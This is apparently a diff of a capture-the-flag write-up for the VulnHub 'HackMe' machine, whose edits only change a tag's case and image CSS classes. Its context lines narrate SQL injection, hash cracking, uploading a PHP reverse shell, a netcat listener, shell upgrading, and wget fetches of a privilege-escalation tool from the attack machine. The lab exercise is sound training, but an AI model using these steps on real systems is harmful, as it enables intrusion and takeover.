@@ -5,14 +5,14 @@ date: 2020-05-28 01:00 +0700
 modified: 2020-05-28 01:00 +0700
 description: Writeup for the HackMe CTF on Vulnhub
 tag:
-  - ctf
+  - CTF
 image: 1-nmap-intense.png
 ---
 
 > Hackme is a CTF challenge which primarily focuses on web application testing. The challenge can be downloaded from VulnHub. To complete this challenge, I used VMware Fusion for virtualization and Kali Linux as my attack machine. Overall, hackme tested a small base of web application testing skills like SQL injection, malicious file upload, and privilege escalation. This CTF has no flags, and the goal is to obtain low-priv user access and ultimately escalate to root.
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="2-dirbuster.png">
     </div>
 </div>
@@ -44,7 +44,7 @@ Now that I've found some services, it was time to take a deeper look into specef
 In dirbuster, I entered the target as http://192.168.8.129. I set the payload to the /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt wordlist. 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="2-dirbuster.png">
     </div>
 </div>
@@ -90,7 +90,7 @@ As dirbuster was running in the background, I did a manual inspection of the web
 <div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img src="https://i2.wp.com/siddfinch.org/wp-content/uploads/2020/06/4-SQL-database-enumeration.png?fit=1024%2C826&amp;ssl=1" alt="" class="wp-image-350" width="768" height="620"/></figure></div>
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="4-SQL-database-enumeration.png">
     </div>
 </div>
@@ -100,7 +100,7 @@ As dirbuster was running in the background, I did a manual inspection of the web
 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="5-SQLi-proof.png">
     </div>
 </div>
@@ -125,7 +125,7 @@ As dirbuster was running in the background, I did a manual inspection of the web
 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="6-SQLi-enumeration-usercolumns.png">
     </div>
 </div>
@@ -155,7 +155,7 @@ Hash-identifier showed these were most likely MD5 hashes. For my first attempt t
 The program was unable to find the passwords. I then proceeded to attempt to crack the hashes with programs like john and hashcat, but after some system difficulties I changed course. I was finally able to find raw text passwords by using the website <a href="https://hashkiller.co.uk/">hashkiller</a>. Entering the hashes into the search bar, the website was able to find matches to previously computed hashes. 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="9-hashkiller.png?">
     </div>
 </div>
@@ -165,7 +165,7 @@ Now armed with usernames and raw text passwords, I logged into the site as the u
 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="/10-welcomeadmin.png?">
     </div>
 </div>
@@ -174,7 +174,7 @@ Now armed with usernames and raw text passwords, I logged into the site as the u
 I noticed the welcomeadmin page had an uploads section, so the first thing I tried was to upload my favorite reverse shell php backdoor script, courtesy of the <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkeys</a>. Prior to uploading the script to the website, I edited the exploit so that the reverse shell would come to my attack machine IP and at port 4447. 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="11-edit-exploit.png">
     </div>
 </div>
@@ -189,7 +189,7 @@ $ nc -nlvp 4447
 I then uploaded the script. To launch the exploit, I navigated to the upload’s directory at /uploads/php-reverse-shell.php . This directory was originally found in my webserver enumeration scans with dirb. After launching the page with the exploit, I received the reverse shell. 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="12-reverse-shell.png">
     </div>
 </div>
@@ -206,7 +206,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="13-updated-shell.png">
     </div>
 </div>
@@ -237,7 +237,7 @@ $ wget http://192.168.8.128/unix-privesc-check
 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="14-upload-privesc.png">
     </div>
 </div>
@@ -260,7 +260,7 @@ Armed with more information, I began a manual search of the target. In the enume
 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="15-cat-passwd.png">
     </div>
 </div>
@@ -274,7 +274,7 @@ $ wget http://92.168.8.129/touchmenot
 ```
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="16-cp-touchmenot.png">
     </div>
 </div>
@@ -289,7 +289,7 @@ Binwalk showed the file was actually an executable. Still not knowing what it do
 
 
 <div class="row mt-3">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="center">
         <img class="img-fluid rounded z-depth-1" src="17-root.png">
     </div>
 </div>
